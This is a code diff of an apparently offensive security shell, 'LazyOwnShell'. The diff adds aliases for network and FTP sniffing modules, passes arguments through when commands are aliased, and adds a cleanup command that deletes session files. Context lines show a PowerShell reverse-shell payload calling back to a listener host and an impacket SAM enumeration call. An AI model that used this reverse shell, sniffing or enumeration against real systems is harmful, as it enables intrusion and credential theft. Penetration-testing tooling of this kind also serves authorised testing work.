@@ -118,10 +118,12 @@ class LazyOwnShell(Cmd):
 """
     # Diccionario para almacenar alias
     aliases = {
-        'ls': 'list',  # Alias para el comando 'list'
+        'ls': 'list',
         'nmap': 'run lazynmap',
         'q': 'exit',
-        'p':'payload',
+        'p': 'payload',
+        'sniff': 'run lazysniff',
+        'ftpsniff': 'run lazyftpsniff',
     }
     os.system("ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,\"\",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, \"/\"); print \"[\033[96m\" iface\"\033[0m] \"a[1] }'")
 
@@ -203,12 +205,18 @@ class LazyOwnShell(Cmd):
 
     def default(self, line):
         """Handle undefined commands (including aliases)."""
-        # Verificar si el comando es un alias
-        cmd = self.aliases.get(line, line)
+        # Obtener el comando o alias
+        command = self.aliases.get(line, line)
+        
+        # Separar el comando y los argumentos si existe
+        parts = command.split(maxsplit=1)
+        cmd_name = parts[0]
+        cmd_args = parts[1] if len(parts) > 1 else ''
         
         # Ejecutar el comando si existe
-        if hasattr(self, f'do_{cmd}'):
-            return getattr(self, f'do_{cmd}')(None)
+        method_name = f'do_{cmd_name}'
+        if hasattr(self, method_name):
+            return getattr(self, method_name)(cmd_args)
         else:
             print(f"{GREEN}[?] {YELLOW} Not Found {BLUE}{line}{RESET}")
 
@@ -1352,7 +1360,10 @@ $client = New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$stream =
         os.system(f"impacket-samrdump -port 445  {rhost}")
 
         return
-
+    def do_clean(self, line):
+        """delete all from sessions"""
+        os.system("rm sessions/*.nmap sessions/revshell* sessions/*.php sessions/hash.txt reports puertos -rf")
+        print(f"{GREEN}[*]{YELLOW} cleanned sessions directory. {RESET}")
     def do_encrypt(self, line):
         """Encrypt a file using XOR. Usage: encrypt <file_path> <key>"""
         args = shlex.split(line)
